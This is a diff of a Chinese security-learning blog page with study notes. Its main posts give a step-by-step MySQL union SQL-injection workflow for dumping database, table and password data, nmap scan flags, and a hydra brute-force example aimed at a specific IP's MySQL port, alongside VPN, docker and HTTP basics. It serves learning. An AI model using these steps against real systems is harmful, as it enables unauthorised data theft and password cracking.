+<blockquote>
+<p>快速注入流程：–&gt;脑图</p>
+</blockquote>
+<p>​    </p>
+<blockquote>
+<p>步骤1.先加’看看会不会有变化，</p>
+</blockquote>
+<p>​    如果变化了–&gt;可能是纯数字、只有单引号、单引号加括号、数字加括号</p>
+<p>如果不出现变化–&gt;双引号、</p>
+<p>步骤2.再加‘%23页面会回复正常</p>
+<p>步骤3.依次排除字符的类型</p>
+<p>步骤4.再在后面加入 1、0</p>
+<blockquote>
+<p>注入可以做哪些事：</p>
+</blockquote>
+<p>获取数据–&gt;<br>    修改数据<br>    上传文件<br>    读取文件</p>
+<blockquote>
+<p>mysql常用   </p>
+</blockquote>
+<p>​    limit 0,1 从0开始取1条记录–&gt;限制输出结果的行数</p>
+<p>select user()    显示当前用户<br>    select database()显示当前使用的数据库<br>    select version()显示版本<br>    select group_concat();连接字符串</p>
+<p>​    select 0x313233会把16进制–&gt;正常数字  0x7e –&gt;~</p>
+<p>联合查询 union select 1，2，3，4，5<br>    需要列数一致，如果不清楚列数，可以用order by来查询</p>
+<p>order by 通过指定列数进行排序–&gt;用来判断有多少列</p>
+<p>distinct 去重</p>
+<blockquote>
+<p>数据库目录知识：    *****</p>
+</blockquote>
+<p>​    information_schema库–&gt;schemata表 存放所有数据库信息，是公用数据库，任何用户都可以访问</p>
+<p>information_schema.schemata   表存放所有数据库名字</p>
+<p>information_schema.TABLES  表存放所有表的名字</p>
+<p>information_schema.COLUMN  表存放所有字段名字</p>
+<p>column_name    字段名<br>    table_schema    库名字段<br>    table_name   表名字段</p>
+<p>查询数据库中有那些库<br>select schema_name from information_schema.SCHEMATA</p>
+<p>查询数据库中有那些表<br>select table_name from information_schema.TABLES</p>
+<p>查询数据库中test库中有哪些表<br>select table_name from information_schema.TABLES where table_schema = ‘test’  // test 可以写成 0x7a73</p>
+<p>查询数据库中有那些字段<br>select column_name from information_schema.COLUMNS</p>
+<p>查询数据库中test库中user表有哪些字段<br>select column_name from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘user’    </p>
+<p>有了库名，表名，列名，然后–&gt;</p>
+<p>猜解内容<br>    select pass from test.user;</p>
+<p>​    </p>
+<blockquote>
+<p>总体流程 </p>
+</blockquote>
+<p>​    1~用‘尝试有没有注入—&gt;可能有注入</p>
+<p>2~用%23 报错恢复–&gt;数字型注入</p>
+<p>3~用order by 1 2 3 4–&gt;测有多少列</p>
+<p>4~用union select 1，2，3进行输出，发现页面不显示–&gt;显示不下</p>
+<p>5~更改显示的内容 –&gt;用limit 1，1或者改条件为id =0</p>
+<p>6~找到1，2，3中显示的数字，改为想要查询的语句</p>
+<p>7.开始查询数据库–&gt;把查询数据库语句替换数字，发现只能显示一行，–&gt;尝试在sql语句两侧加入（），还是不行–&gt;加入group_concat，发现正常</p>
+<p>理解：直接放入sql语句不符合代码规范，必须括起来；加入group_concat恢复正常，是因为查询所有的库名字时返回的结果是多行，而union select 的第三位是只能写单行内容！！！，所以用group_concat进行组合成一行    </p>
 
-                
-
-                </ul>
-                <p class="copyright text-muted">
-                    Copyright &copy; pengpengp&#39;s BLOG 2020
-                    <br>
-                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
-                    <br>
-                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
-                </p>
-
-            </div>
-        </div>
+      
     </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2018/12/28/sql-inject-Process/" data-id="ckgg5oe0r000tzov29ddz6jm9" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" rel="tag">sql注入流程</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql-inject" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/28/sql-inject/" class="article-date">
+  <time datetime="2018-12-28T12:05:18.000Z" itemprop="datePublished">2018-12-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/28/sql-inject/">&#39;sql_inject&#39;</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>流程：</p>
+</blockquote>
+<blockquote>
+<p>1.前期沟通</p>
+</blockquote>
+<blockquote>
+<p>2.信息搜集（四五天）</p>
+</blockquote>
+<blockquote>
+<p>3.威胁建模：根据信息进行分析攻击点（一天）</p>
+</blockquote>
+<blockquote>
+<p>4.渗透测试：根据分析进行攻击</p>
+</blockquote>
+<blockquote>
+<p>5.后渗透测试：根据测试结果进行更多尝试</p>
+</blockquote>
+<blockquote>
+<p>6.写报告</p>
+</blockquote>
+<p>​    </p>
+<pre><code>    www.exploit-db.com
+    https://www.somd5.com/
+    https://blog.csdn.net/u012278016/article/details/81772566</code></pre>
+<p>扫描工具：</p>
+<ul>
+<li><p>测网站漏洞工具：    </p>
+<p>​    AWVS（通过爬虫进行网站漏洞测试）的安装</p>
+<p>​    网站漏洞扫描<a target="_blank" rel="noopener" href="https://butian.360.cn/Register/%E8%A1%A5%E5%A4%A9%E5%85%AC%E7%9B%8A">https://butian.360.cn/Register/补天公益</a></p>
+<p>​    啊d–&gt;ASP网站</p>
+<p>​    sql注入工具</p>
+<pre><code>    sqlmap</code></pre>
+</li>
+<li><p>综合平台类：</p>
+<p>BurpSuite、Metasploit</p>
+</li>
+<li><p>搜集域名信息</p>
+<p>//子域名：news.baidu.com这种</p>
+<pre><code>子域名挖掘：subDomainsBrute、子域名挖掘机</code></pre>
+</li>
+<li><p>端口扫描：NMAP—功能强大，隐蔽</p>
+<p>安装vc扩展、npcap组件，增加环境变量</p>
+<pre><code>扫描指定ip：    nmap ip
+原理：只发送SYN，不建立连接
+nmap -Pn  强制为激活的主机，进行强制扫描
+nmap -sn  主机发现
+nmap    -sn -oX     Desktop/report.mxl报告输出到文件
+nmap -sS    半开放扫描（默认方式）
+nmap -p 80    指定扫描端口
+nmap -O    ip    探测操作系统版本
+nmap -A        详细信息
+nmap -iL 目录 根据ip列表进行扫描
+nmap -iL 目录 --webxml 文件名    把结果以xml形式&gt;输出        到文件</code></pre>
+</li>
+<li><p>python环境安装</p>
+<p>1.安装python2.7</p>
+<pre><code>2.在家目录下创建.pip文件夹，把源文件移动进去
+3.执行pip install requests</code></pre>
+</li>
+<li><p>字典生成工具</p>
+<p>pentest.db工具</p>
+<pre><code>解压，在目录中用cmd执行pip install lxml
+使用 python pen.py
+帮助    python pen.py --help</code></pre>
+</li>
+<li><p>爆破工具</p>
+<p>*BurpSuite</p>
+<pre><code>*hydra***   hydra -l用户名 -p密码字典 
+-s指定非默认端口
+-e ns空密码试探
+-f成功后立刻停止
+例子：hydra -l root -P 目录 -s 3308  -e ns -t 5         114.115.175.102 mysql</code></pre>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2018/12/28/sql-inject/" data-id="ckgg5oe0s000wzov20o29e20h" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Create-VPN" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/26/Create-VPN/" class="article-date">
+  <time datetime="2018-12-26T13:24:00.000Z" itemprop="datePublished">2018-12-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/26/Create-VPN/">Create_VPN</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong><em>创建VPN连接</em></strong></p>
+<p>一.安装浏览器插件<br>    hackbar、Header Edit、wappalzer、 proxy、server ip</p>
+<p>二.在windows 2008上搭建vpn</p>
+<p>搭建PPTP连接</p>
+<blockquote>
+<p>1.打开服务管理器—&gt;添加角色—-&gt;勾选“网络策略和访问服务 ”——&gt;下一步—–&gt;勾选”路由和远程访问服务”—&gt;开始安装</p>
+</blockquote>
+<blockquote>
+<p>2.角色中出现了“路由和远程访问”，现在是红色的，右键选择配置它，打开向导—&gt;选择自定义配置–&gt;服务里全选–&gt;完成–&gt;变成绿色</p>
+</blockquote>
+<blockquote>
+<p>3.新增一个接口：ipv4–&gt;NAT—&gt;新建一个接口–&gt;选择要使用的网卡—&gt;接口类型选择“公用接口连接到Internet”,勾选“在此接口上启用NAT”</p>
+</blockquote>
+<blockquote>
+<p>4.开始菜单–&gt;管理工具–&gt;网络策略服务器–&gt;策略–&gt;网络策略–&gt;把里面的两项被组织的属性改成“授予访问权限”</p>
+</blockquote>
+<blockquote>
+<p>5.服务器管理器–&gt;配置–&gt;本地用户和组–&gt;添加一个用户–&gt;填写用户名、密码、勾选“用户不能更改密码”和“密码永不过期”，去掉“下次登陆须更改密码”的勾，点创建。</p>
+</blockquote>
+<blockquote>
+<p>6.开始菜单–&gt;管理工具–&gt;本地安全策略–&gt;本地策略–&gt;用户权限分配–&gt;拒绝本地登陆，添加vpn用户—&gt;拒绝通过远程桌面登陆,添加vpn用户。</p>
+</blockquote>
+<blockquote>
+<p>7.连接VPN：在客户机创建一个新连接–&gt;选择连接到工作区—&gt;使用我的internet连接–&gt;填写ip地址–&gt;填写之前创建的VPN用户名和密码–&gt;连接即可</p>
+</blockquote>
+<p>三.docker：</p>
+<blockquote>
+<p>安装docker：sudo apt-get install docker.io</p>
+</blockquote>
+<blockquote>
+<p>安装加速器（可选）<a target="_blank" rel="noopener" href="https://yeasy.gitbooks.io/docker_practice/install/mirror.html">https://yeasy.gitbooks.io/docker_practice/install/mirror.html</a></p>
+</blockquote>
+<blockquote>
+<p>或者在 /etc/docker/daemon.json 中写入<br>    {<br>        “registry-mirrors”: [“<a href="https://registry.docker-cn.com&quot;]">https://registry.docker-cn.com&quot;]</a><br>    }</p>
+</blockquote>
+<blockquote>
+<p>启动docker：sudo docker run –rm -it alpine /bin/sh</p>
+</blockquote>
+<blockquote>
+<p>在docker中启动ubuntu：sudo docker run –rm -it ubuntu /bin/sh</p>
+</blockquote>
+<blockquote>
+<p>在docker中启动centOS：sudo docker run –rm -it centos /bin/sh</p>
+</blockquote>
+<p>四.VPN :PPTP   L2TP </p>
+<p>第一种连接方法：</p>
+<blockquote>
+<p>1.把镜像拉入虚拟机：</p>
+</blockquote>
+<blockquote>
+<p>2.docker pull mobtitude/vpn-pptp<br>然后创建一个文件chap-secrets，打开写入   name *  password * 并记住路径/vpn-k</p>
+</blockquote>
+<blockquote>
+<p>3.docker run -d –privileged –net host -v /root/chap-secrets:/ppp/chap-secrets mobtitude/vpn-pptp</p>
+</blockquote>
+<p>第二种连接方法：</p>
+<blockquote>
+<p>1.docker pull hwdsl2/ipsec-vpn-server</p>
+</blockquote>
+<blockquote>
+<p>2.modprobe af_key</p>
+</blockquote>
+<blockquote>
+<p>3.VPN_IPSEC_PSK=ipsec-keydoc<br>VPN_USER=uname<br>VPN_PASSWORD=upass</p>
+</blockquote>
+<blockquote>
+<p>4.docker run –name vpn-docker –privileged –env-file /root/vpn.env -p 500:500/udp -p 4500:4500/udp -v /lib/modules:/lib/modules:ro  -d –privileged hwdsl2/ipsec-vpn-server</p>
+</blockquote>
+<p>第三种方法：使用shadowsocks工具代理连接VPN</p>
+<blockquote>
+<p>1.apt install shadowsocks先安装</p>
+</blockquote>
+<blockquote>
+<p>2.修改配置文件  vi /etc/shadowsocks/config.json</p>
+</blockquote>
+<pre><code>&quot;server&quot;:&quot;0.0.0.0&quot;,
+&quot;server_port&quot;:8888,
+&quot;local_address&quot;: &quot;127.0.0.1&quot;,
+&quot;local_port&quot;:1080,
+&quot;password&quot;:&quot;123456&quot;,
+&quot;timeout&quot;:300,
+&quot;method&quot;:&quot;aes-256-cfb&quot;,
+&quot;fast_open&quot;: false,
+&quot;workers&quot;: 1,
+&quot;prefer_ipv6&quot;: false</code></pre>
+<blockquote>
+<p>3.（可选）开启BBR加速支持echo “net.core.default_qdisc=fq” &gt;&gt; /etc/sysctl.conf<br>echo “net.ipv4.tcp_congestion_control=bbr” &gt;&gt; /etc/sysctl.conf<br>sysctl -p<br>lsmod | grep bbr</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2018/12/26/Create-VPN/" data-id="ckgg5oe0d0001zov28hydhd2n" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-http-request" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/12/24/http-request/" class="article-date">
+  <time datetime="2018-12-24T13:44:39.000Z" itemprop="datePublished">2018-12-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/12/24/http-request/">http_request </a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>*** 一.http基础：</p>
+<ul>
+<li><p>URL：<a href="http://admin:123@www.baidu.com：80/new/index.php？id=1#">http://admin:123@www.baidu.com：80/new/index.php？id=1#</a><br>  *协议  + http基础认证  +域名     +端口  +路径  +文件名  +参数  +锚部分</p>
+</li>
+<li><p>URL编码****</p>
+<pre><code>  ‘’    --%27
+  “”    --%22
+  #    --%23
+  空格    --%20
+  %    --%25</code></pre>
+</li>
+<li><p>GET\POST请求结构</p>
+<pre><code>  GET请求
+  GET  /HTTP基础/123.txt   /HTTP/1.1
+  hOST:192.168.11.111:8000
+  Accept：*/*
+  换行
+
+  POST请求
+  POST /HTTP基础/123.txt   /HTTP/1.1
+  hOST:192.168.11.111:8000
+  Accept：*/*
+  换行
+  id=123&amp;password=123</code></pre>
+</li>
+<li><p>请求方法：</p>
+<pre><code>  GET
+  HEAD  用于捕获报头
+  PUT        iis put方法漏洞（自己研究）
+  DELETE    请求删除
+  CONNECT
+  OPTIONS    允许客户端查看服务器支持的方法</code></pre>
+</li>
+<li><p>*状态码   302临时重定向（location）</p>
+<pre><code>  301永久跳转        百度看一下区别
+
+  400
+  403 禁止访问
+  404    Not Found
+  405  不允许
+
+  5xx  服务器问题（代码）</code></pre>
+</li>
+<li><p>练习：用wireshark抓http数据包</p>
+</li>
+</ul>
+<p>** 二.总结请求头：</p>
+<ul>
+<li><p>Host：表示服务器监听的端口号；</p>
+</li>
+<li><p>User-Agent：请求所使用的浏览器</p>
+</li>
+<li><p>Accept：可接受的响应类型     例子：Accept: text/plain（当作文本不处理）     text/html （调用HTML解析器进行解析）</p>
+</li>
+<li><p>Accept-language：可接受的相应语言清单 例子：<br>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p>
+</li>
+<li><p>Accept-Encoding：    可接受的响应的编码方式    例子：gzip, deflate</p>
+</li>
+<li><p>Cache-Control：指定当前的请求/回复中，是否使用缓存</p>
+</li>
+<li><p>Pragma：只用于客户端发送的请求中。客户端会要求所有的中间服务器不返回缓存的资源。<br>如果所有的中间服务器都以实现http/1.1为标准，那么直接使用Cache-Control:no-cache即可，如果不是的话，就要包含两个字段</p>
+</li>
+<li><p>Connection：处理完这次请求后是否断开连接还是继续保持连接    例子：close</p>
+</li>
+<li><p>Referer：客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的（防盗链）</p>
+</li>
+<li><p>Cookie：客户机通过这个头可以向服务器带数据</p>
+</li>
+</ul>
+<p>*****三.重点：  五层模型、tcp三次握手 、 四次挥手 、wireshark、http请求\响应的行、头、空行、内容 、burpSuite代理，看数据包    </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2018/12/24/http-request/" data-id="ckgg5oe0m000fzov28bcs1mr1" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker-api-php-registry/" rel="tag">docker-api,php,registry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/information-collect/" rel="tag">information collect</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E5%91%BD%E4%BB%A4%E4%B9%8B%E6%9F%A5%E6%89%BE/" rel="tag">linux命令之查找</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python-%E6%89%AB%E6%8F%8F/" rel="tag">python 扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis%E6%BC%8F%E6%B4%9E-%E4%B8%80%E8%88%AC%E5%86%85%E7%BD%91%EF%BC%89/" rel="tag">redis漏洞(一般内网）</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell-%E8%84%9A%E6%9C%AC-Linux-search/" rel="tag">shell 脚本 Linux search</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell%E5%8F%8D%E5%BC%B9%E3%80%81powershell%E5%8F%8D%E5%BC%B9/" rel="tag">shell反弹、powershell反弹</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-inject/" rel="tag">sql_inject</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" rel="tag">sql注入流程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows-%E5%9F%9F-%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">windows 域 域渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91-%E6%8F%90%E6%9D%83/" rel="tag">内网/提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" rel="tag">内网转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8/" rel="tag">常用工具及使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">文件包含漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BF%87waf/" rel="tag">过waf</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/docker-api-php-registry/" style="font-size: 10px;">docker-api,php,registry</a> <a href="/tags/information-collect/" style="font-size: 10px;">information collect</a> <a href="/tags/linux%E5%91%BD%E4%BB%A4%E4%B9%8B%E6%9F%A5%E6%89%BE/" style="font-size: 10px;">linux命令之查找</a> <a href="/tags/python-%E6%89%AB%E6%8F%8F/" style="font-size: 10px;">python 扫描</a> <a href="/tags/redis%E6%BC%8F%E6%B4%9E-%E4%B8%80%E8%88%AC%E5%86%85%E7%BD%91%EF%BC%89/" style="font-size: 10px;">redis漏洞(一般内网）</a> <a href="/tags/shell-%E8%84%9A%E6%9C%AC-Linux-search/" style="font-size: 10px;">shell 脚本 Linux search</a> <a href="/tags/shell%E5%8F%8D%E5%BC%B9%E3%80%81powershell%E5%8F%8D%E5%BC%B9/" style="font-size: 10px;">shell反弹、powershell反弹</a> <a href="/tags/sql-inject/" style="font-size: 10px;">sql_inject</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">sql注入</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/" style="font-size: 10px;">sql注入流程</a> <a href="/tags/windows-%E5%9F%9F-%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">windows 域 域渗透</a> <a href="/tags/%E5%86%85%E7%BD%91-%E6%8F%90%E6%9D%83/" style="font-size: 10px;">内网/提权</a> <a href="/tags/%E5%86%85%E7%BD%91%E8%BD%AC%E5%8F%91/" style="font-size: 10px;">内网转发</a> <a href="/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">常用工具及使用</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/%E8%BF%87waf/" style="font-size: 10px;">过waf</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/19/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/31/python%E6%89%B9%E9%87%8F%E7%88%AC%E5%8F%96URL%E9%85%8D%E5%90%88AWVS/">python批量爬取URL配合AWVS</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/24/first-shell/">first shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/24/docker-api/">php与docker-api与私有仓库</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/24/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
 </footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
-<!-- jQuery -->
-
-<script src="/js/jquery.min.js"></script>
-
-
-<!-- Bootstrap Core JavaScript -->
-
-<script src="/js/bootstrap.min.js"></script>
-
-
-<!-- Custom Theme JavaScript -->
-
-<script src="/js/blog.js"></script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
 
-<!-- async load function -->
-<script>
-    function async(u, c) {
-      var d = document, t = 'script',
-          o = d.createElement(t),
-          s = d.getElementsByTagName(t)[0];
-      o.src = u;
-      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
-      s.parentNode.insertBefore(o, s);
-    }
-</script>
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
-<!-- jquery.tagcloud.js -->
-<script>
-    // only load tagcloud.js in tag.html
-    if($('#tag_cloud').length !== 0){
-        async("https://pengpengp.github.io/js/jquery.tagcloud.js",function(){
-            $.fn.tagcloud.defaults = {
-                //size: {start: 1, end: 1, unit: 'em'},
-                color: {start: '#bbbbee', end: '#0085a1'},
-            };
-            $('#tag_cloud a').tagcloud();
-        })
-    }
-</script>
-
-<!--fastClick.js -->
-<script>
-    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
-        var $nav = document.querySelector("nav");
-        if($nav) FastClick.attach($nav);
-    })
-</script>
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
 
-<!-- Google Analytics -->
+
+<script src="/js/script.js"></script>
 
 
 
-<!-- Baidu Tongji -->
 
-
-<!-- swiftype -->
-<script type="text/javascript">
-  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
-  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
-  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
-  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
-
-  _st('install','','2.0.0');
-</script>
-
-<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<!--wechat title img-->
-<img class="wechat-title-img" src="">
+  </div>
 </body>
-
 </html>
